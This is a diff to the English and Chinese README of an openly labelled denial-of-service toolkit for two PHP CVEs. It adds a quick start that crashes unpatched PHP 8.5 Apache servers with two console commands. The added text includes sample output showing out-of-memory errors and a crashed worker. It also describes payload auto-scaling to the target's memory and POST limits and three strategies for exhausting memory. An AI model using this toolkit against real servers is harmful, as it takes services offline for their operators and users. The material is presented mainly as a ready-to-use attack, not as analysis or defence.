@@ -10,6 +10,45 @@
 
 Universal DoS attack toolkit for PHP CVE-2026-109618 and CVE-2026-109619.
 
+### Quick Start
+
+```bash
+python interactive.py
+```
+
+```
+DoS> target 192.168.1.10:8088
+DoS> 109618
+```
+
+Two commands to trigger OOM on any unpatched PHP 8.5 Apache server. The console auto-detects the target's `memory_limit` and `post_max_size`, then scales the payload to fit within the POST budget while exceeding the memory limit.
+
+- **`109618`** — CVE-2026-109618 multipart OOM (triggers `Allowed memory size exhausted` on parsing)
+- **`session`** — CVE-2026-109619 session A→B crash (producer OOM + consumer hits freed heap → worker crash)
+
+```
+DoS> target 192.168.1.10:8088
+Target set: http://192.168.1.10:8088
+
+DoS> 109618
+[CVE-2026-109618] OOM attack — part-headers
+Step 1: Health check (baseline)...
+  PID: 19104, HTTP 200
+  post_max_size=8M, memory_limit=128M
+  Auto-fit within 8 MiB: part-headers=599,168
+Step 2: Sending 7.3 MiB multipart (part-headers)...
+  Fatal error: Allowed memory size of 134217728 bytes exhausted
+  OOM triggered!
+
+DoS> session
+[CVE-2026-109619] Session lifecycle probe
+Step 3: Producer (OOM with session progress)...
+  OOM triggered
+Step 4: Consumer (session progress callback on stale state)...
+  ConnectionResetError
+  Worker crashed! (connection reset)
+```
+
 ### Interactive Console
 
 ```bash
@@ -39,9 +78,9 @@ Commands:
 Crafted multipart request bodies trigger OOM (out-of-memory) during PHP's request parsing phase, crashing the Apache worker.
 
 Three OOM trigger strategies:
-- **part-headers** — a single multipart part with massive custom headers (default 5000, max 150000)
-- **empty-files** — many empty file fields (default 500, max 10000)
-- **form-value** — a single 6 MiB form value (requires `memory_limit 8M`)
+- **part-headers** — a single multipart part with massive custom headers (auto-scaled to fit `post_max_size`)
+- **empty-files** — many empty file fields (capped by PHP `max_multipart_body_parts`)
+- **form-value** — large form value (requires `post_max_size >= memory_limit`)
 
 ```bash
 # Dry run (generates JSON only, no requests sent)
@@ -138,6 +177,45 @@ HTTP 500, connection reset, worker PID change, or OOM **alone are insufficient t
 
 PHP CVE-2026-109618 和 CVE-2026-109619 的通用拒绝服务攻击工具集。
 
+### 快速开始
+
+```bash
+python interactive.py
+```
+
+```
+DoS> target 192.168.1.10:8088
+DoS> 109618
+```
+
+两条命令即可对任意未修补的 PHP 8.5 Apache 服务器触发 OOM。控制台自动检测目标的 `memory_limit` 和 `post_max_size`，在 POST 预算内自动放大 payload 超过内存限制。
+
+- **`109618`** — CVE-2026-109618 multipart OOM（解析阶段触发 `Allowed memory size exhausted`）
+- **`session`** — CVE-2026-109619 session A→B 崩溃（producer OOM + consumer 访问已释放堆 → worker 崩溃）
+
+```
+DoS> target 192.168.1.10:8088
+Target set: http://192.168.1.10:8088
+
+DoS> 109618
+[CVE-2026-109618] OOM attack — part-headers
+Step 1: Health check (baseline)...
+  PID: 19104, HTTP 200
+  post_max_size=8M, memory_limit=128M
+  Auto-fit within 8 MiB: part-headers=599,168
+Step 2: Sending 7.3 MiB multipart (part-headers)...
+  Fatal error: Allowed memory size of 134217728 bytes exhausted
+  OOM triggered!
+
+DoS> session
+[CVE-2026-109619] Session lifecycle probe
+Step 3: Producer (OOM with session progress)...
+  OOM triggered
+Step 4: Consumer (session progress callback on stale state)...
+  ConnectionResetError
+  Worker crashed! (connection reset)
+```
+
 ### 交互控制台
 
 ```bash
@@ -167,9 +245,9 @@ Commands:
 通过构造特殊的 multipart 请求体，在 PHP 请求解析阶段触发 OOM（内存耗尽），导致 Apache worker 异常退出。
 
 三种 OOM 触发策略：
-- **part-headers** — 单个 multipart part 附加大量自定义头（默认 5000，上限 150000）
-- **empty-files** — 大量空文件字段（默认 500，上限 10000）
-- **form-value** — 单个 6 MiB 表单值（配合 `memory_limit 8M`）
+- **part-headers** — 单个 multipart part 附加大量自定义头（自动缩放至 `post_max_size` 内）
+- **empty-files** — 大量空文件字段（受 PHP `max_multipart_body_parts` 限制）
+- **form-value** — 超大表单值（需 `post_max_size >= memory_limit`）
 
 ```bash
 # Dry run（只生成 JSON，不发请求）
